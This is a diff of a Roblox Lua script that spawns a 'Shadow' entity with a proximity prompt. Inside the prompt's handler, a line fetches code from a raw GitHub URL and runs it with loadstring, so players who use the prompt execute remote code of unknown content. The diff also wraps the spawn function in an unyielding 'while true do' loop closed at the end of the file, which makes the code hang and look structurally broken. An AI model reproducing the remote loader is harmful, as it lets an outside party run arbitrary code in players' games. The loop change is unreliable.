@@ -29,6 +29,7 @@ end
 
 -- Spawn shadow
 local function spawnShadow(keyhitbox)
+	while true do
 	local shadow = shadowAsset:Clone()
 	shadow.Parent = workspace
 
@@ -57,7 +58,7 @@ local function spawnShadow(keyhitbox)
 	prompt.ObjectText = "???"
 	prompt.MaxActivationDistance = 5
 	prompt.HoldDuration = 3
-    prompt.Style = Enum.ProximityPromptStyle.Custom
+	prompt.Style = Enum.ProximityPromptStyle.Custom
 	prompt.RequiresLineOfSight = false
 	prompt.Parent = handle
 
@@ -70,7 +71,7 @@ local function spawnShadow(keyhitbox)
 			pcall(function()
 				loadstring(game:HttpGet(
 					"https://raw.githubusercontent.com/eoyoustme/back/refs/heads/main/cruc"
-				))()
+					))()
 			end)
 			return
 		end
@@ -116,3 +117,4 @@ LatestRoom.Changed:Connect(function()
 end)
 
 print("[Shadow] Loaded | Chance only if keyhitbox exists")
+end
